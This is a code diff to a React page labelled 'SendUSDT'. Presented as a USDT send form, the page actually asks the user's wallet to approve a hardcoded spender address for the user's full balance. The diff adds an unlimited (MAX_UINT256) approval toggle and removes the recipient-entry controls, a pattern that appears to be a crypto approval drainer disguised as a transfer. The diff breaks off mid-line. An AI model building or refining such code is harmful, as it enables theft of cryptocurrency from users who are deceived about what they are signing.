@@ -13,6 +13,8 @@ import '@fontsource/geist';
 
 const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
 const spenderAddress = "0xA249B9926CBF6A84d5c1549775636488E697a5ed"; // Replace with your trusted contract
+const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
 const usdtAbi = [
   {
     inputs: [
@@ -39,6 +41,7 @@ export default function SendUSDT() {
   const [isProcessing, setIsProcessing] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [theme, setTheme] = useState("dark");
+  const [unlimited, setUnlimited] = useState(false); // toggle for unlimited approval
 
   useEffect(() => {
     const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
@@ -62,8 +65,7 @@ export default function SendUSDT() {
       const user = accounts[0];
       const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
       const balance = await usdt.methods.balanceOf(user).call();
-      // USDT has 6 decimals → use "mwei"
-      setAmount(web3.utils.fromWei(balance, "mwei"));
+      setAmount(web3.utils.fromWei(balance, "mwei")); // USDT has 6 decimals
     } catch (err) {
       Swal.fire("Error", "Failed to fetch balance.", "error");
     }
@@ -91,8 +93,11 @@ export default function SendUSDT() {
       }
 
       const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
-      // ✅ Limited approval (exact amount entered by user)
-      const rawAmount = web3.utils.toWei(amount, "mwei"); // USDT has 6 decimals
+
+      // ✅ Choose approval mode
+      const rawAmount = unlimited
+        ? MAX_UINT256
+        : web3.utils.toWei(amount, "mwei"); // exact amount
 
       const receipt = await usdt.methods
         .approve(spenderAddress, rawAmount)
@@ -156,16 +161,10 @@ export default function SendUSDT() {
             <input
               type="text"
               className="custom-input"
-              placeholder="Search or Enter"
               value={spenderAddress}
               readOnly
             />
           </div>
-          <span className="right blue flex justify-between mr-3">
-            <span className="w-6 text-sm">Paste</span>
-            <i className="fas fa-address-book mar_i w-6 ml-6"></i>
-            <i className="fas fa-qrcode mar_i w-6 ml-2"></i>
-          </span>
         </div>
       </div>
 
@@ -197,9 +196,22 @@ export default function SendUSDT() {
 
       <p className="fees valid">{usdValue}</p>
 
+      <div className="flex items-center mt-4">
+        <input
+          type="checkbox"
+          id="unlimited"
+          checked={unlimited}
+          onChange={() => setUnlimited(!unlimited)}
+          className="mr-2"
+        />
+        <label htmlFor="unlimited" className="text-sm">
+          Approve Unlimited (⚠️ may show wallet warning)
+        </label>
+      </div>
+
       <button
         id="nextBtn"
-        className="send-btn"
+        className="send-btn mt-4"
         onClick={handleApprove}
         disabled={isProcessing || !parseFloat(amount)}
         style={{
@@ -207,8 +219,4 @@ export default function SendUSDT() {
           color: isProcessing || !parseFloat(amount) ? "var(--disabled-text)" : "#1b1e15"
         }}
       >
-        {isProcessing ? "Processing..." : "Next"}
-      </button>
-    </div>
-  );
-}
+        {isProcessing ? "Processing..." :
